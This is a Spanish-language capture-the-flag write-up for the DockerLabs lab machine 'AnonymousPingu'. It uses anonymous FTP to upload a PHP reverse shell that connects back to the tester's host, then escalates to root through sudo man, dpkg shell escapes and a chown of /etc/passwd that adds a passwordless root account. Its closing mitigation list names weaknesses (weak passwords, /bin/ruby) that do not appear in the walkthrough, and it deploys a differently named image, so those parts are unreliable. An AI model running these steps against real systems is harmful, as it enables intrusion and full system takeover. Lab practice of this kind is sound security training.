# Writeup: AnonymousPingu

- **Máquina:** AnonymousPingu (DockerLabs)
- **Enlace:** [https://dockerlabs.es/maquinas/103/descargar](https://dockerlabs.es/maquinas/103/descargar)
- **Dificultad:** Fácil
- **Fecha:** 13 de Noviembre 2026

---

## Objetivo
Acceder `root` mediante login FTP, reverse shell y escalada de privilegios en Linux

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh amor.tar
```
<img width="576" height="360" alt="01 DESPLIEGE DOCKERLABS" src="https://github.com/user-attachments/assets/a29d7ee9-b8ea-48f2-be52-d846dad76585" />




Para comprobar que el servicio se encuentre activo se usó `ping`:

```bash
$ ping 172.17.0.2
```
Resultado:
```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.585 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.069 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.067 ms
3 packets transmitted, 3 received, 0% packet loss, time 2262ms
```

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando dos puertos abiertos:

```bash
$ nmap -p- -sCV 172.17.0.2 -o scan_anonymouspingu.txt
```

```bash
PORT   STATE SERVICE
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

Al visitar **http://172.17.0.2** en el navegador, se encontró una página web perteneciente a **Heustonn**.

<img width="1366" height="472" alt="Captura de pantalla (353)" src="https://github.com/user-attachments/assets/69a0e955-ab37-4ff7-acc2-15ffc217a89d" />



--- 

## 2. Identificación de vulnerabilidades
Se realizó enumeración web con `gobuster`:

```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt 
```

<img width="649" height="351" alt="Captura de pantalla (354)" src="https://github.com/user-attachments/assets/cb9bb953-1b26-4602-97d6-2efc960aa49c" />

Como resultado se obtuvieron los directorios **/css**, **/images** y **/js** que contienen los elementos necesarios para que la página web funcione y el directorio **/upload** donde será posible cargar código malicioso.


<img width="387" height="171" alt="Captura de pantalla (355)" src="https://github.com/user-attachments/assets/97dbfe78-31af-4021-86b1-591d200df563" />



---
## 3. Explotación
### 3.1. Login FTP
Se realizó login anónimo con FTP:

```bash
$ ftp Anonymous@172.17.0.2
```

```bash
VConnected to 172.17.0.2.
220 (vsFTPd 3.0.5)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Una vez logeados, se analizaron los permisos que **Anonymous** tiene en cada uno de los directorios.

```bash
ftp> ls
```

<img width="573" height="232" alt="Captura de pantalla (356)" src="https://github.com/user-attachments/assets/6066d6f8-ce6a-4530-9e45-c0796fac74e8" />

Se observa que **Anonymous** tiene permisos de escritura en **/upload**. Esto facilita la carga de una reverse shell ya que no es necesario pivotar a ningún otro usuario.





### 3.2. Despliegue de reverse shell
Se creó un nuevo archivo `.php` que contiene las instrucciones para la reverse shell.

```bash
$ nano reverse_shell.php
```

```bash
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
 ?>
```


Desde FTP se carga el archivo **revrse_shell.php** al directorio **/upload**.

```bash
ftp> cd upload
ftp> put reverse_shell.php
```

<img width="1349" height="135" alt="Captura de pantalla (357)" src="https://github.com/user-attachments/assets/7d1e2cdb-7b80-4394-889f-93c81da7abf0" />

<img width="392" height="176" alt="Captura de pantalla (358)" src="https://github.com/user-attachments/assets/297a1793-e6a6-42fb-b521-379e5013ee3d" />

Se dejó a `netcat` escuchando en el puerto 443 antes de hacer click sobre la reverse shell para ejecutarla y obtener acceso como **www-data**.

```bash
$ nc -lnvp 443
listening on [any] 443 ...
```

<img width="636" height="223" alt="Captura de pantalla (360)" src="https://github.com/user-attachments/assets/737e535f-6c42-4722-a7ed-586ba973ad1c" />


### 3.3. Estabilización de TTY

Para evitar inconvenientes y convertir esta terminar remota limitada en una terminal funcional y completa, se realizó tratamiento TTY. Es necesario realizarlo para continuar con el laboratorio.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo; fg
reset
```


### 3.4. Escalada a user pingu

Se ejecutó `sudo -l` para ver los privilegios disponibles de **www-data**. 

```bash
User www-data may run the following commands on 9233486e355a:
    (pingu) NOPASSWD: /usr/bin/man
```

El usuario puede ejecutar `/bin/man` como **pingu** y sin contraseña.


Ejeución de `man` como **pingu**:

```bash
sudo -u pingu /usr/bin/man man
!/bin/bash
```

<img width="433" height="110" alt="Captura de pantalla (361)" src="https://github.com/user-attachments/assets/d6bc0c0d-5637-4c15-89bb-d3a3b283dce8" />


### 3.4. Escalada a user gladys

Se ejecutó `sudo -l` para ver los privilegios disponibles de **pingu**. 

```bash
User pingu may run the following commands on 9233486e355a:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg
```

```bash
sudo -u gladys /usr/bin/dpkg -l
!/bin/bash
```

### 3.4. Escalada a root

Se ejecutó `sudo -l` para ver los privilegios disponibles de **gladys**. 

```bash
User gladys may run the following commands on 9233486e355a:
    (root) NOPASSWD: /usr/bin/chown
```

```bash
sudo chown $(id -un):$(id -gn) /etc/passwd
ls -la /etc/passwd
```


```bash
echo "alberto::0:0:root:/root:/bin/bash" >> /etc/passwd
su alberto
```

 
---
## Acciones de mitigación
- **Divulgación de usuarios válidos en página web pública**: nunca divulgar información sensible en servicios públicos, utilizar redes internas y seguras para transmitir información.
- **Contraseña débil vulnerable a ataques de fuerza bruta**: aplicar políticas de contraseñas más seguras e implementar verificación en dos pasos (MFA).
- **Escalada de privilegios mediante`/bin/ruby`**: aplicar principio de menor privilegio, eliminar `/bin/ruby` de sudoers.
---
